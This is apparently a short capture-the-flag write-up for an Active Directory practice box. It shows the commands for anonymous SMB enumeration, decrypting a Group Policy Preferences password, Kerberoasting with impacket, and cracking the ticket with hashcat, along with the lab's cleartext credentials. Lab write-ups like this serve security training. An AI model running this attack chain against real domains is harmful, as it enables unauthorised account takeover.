An easy Windows box introducing 2 commmon hacks on Active Directory. 


User Flag

nmap shows that SMB is present, LDAP is present. 
Use smbclient with anonymous&no-pass to view public files. 
- smbclient -L //10.129.103.113/ -N 
<img width="734" height="255" alt="image" src="https://github.com/user-attachments/assets/c913a2f6-47be-4fea-9a8d-6bd76591c4c8" />
Enumerate the share folders, folder Replication is accessible. Enumerate all folders within Replication, found one file groups.xml that contains an encrypted password. User name is SVC_TGS. 
smb location: \active.htb\policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\machine\preferences\groups\Groups.xml
<img width="794" height="76" alt="image" src="https://github.com/user-attachments/assets/90dfef54-c299-4a2d-82e6-6c33975fa9d4" />
<img width="838" height="130" alt="image" src="https://github.com/user-attachments/assets/99b2618b-5f7e-470d-83e5-e0acd8703cf1" />

This looks like AES encrypted. use gpp-decrypt to get cleartext "GPPstillStandingStrong2k18"
- gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"

<img width="893" height="39" alt="image" src="https://github.com/user-attachments/assets/9e7e3e1f-614f-4964-8fd3-dc21aed50dfe" />

With the credentials SVC-TGS:GPPstillStandingStrong2k18, more of smb shares are available. Can find user flag on SVC_TGS account's desktop.
<img width="641" height="82" alt="image" src="https://github.com/user-attachments/assets/556b64a8-2808-4c5e-b8cc-04538c46b0ad" />


Root Flag

The credentials can also be used to perform kerberoasting attack with impacket.
- 	GetUserSPNs.py -request -dc-ip 10.129.103.113 active.htb/svc_tgs
<img width="1132" height="530" alt="image" src="https://github.com/user-attachments/assets/272b9961-9d61-43cc-958f-4856f2ff7da5" />

Use Hashcat and rockyou.txt to get the password for Administrator (hash saved in admin.hash)
- hashcat -m 13100 ./admin.hash ~/share/wordlists/rockyou.txt --force
<img width="651" height="322" alt="image" src="https://github.com/user-attachments/assets/08c868fe-f615-4102-a91d-119b6bb0e5be" />

Use the credentials administrator:Ticketmaster1968 to access smb share, can find root.txt on adminsitrator's desktop.
<img width="621" height="94" alt="image" src="https://github.com/user-attachments/assets/7189ec23-006b-4043-925d-efccdeab13fa" />










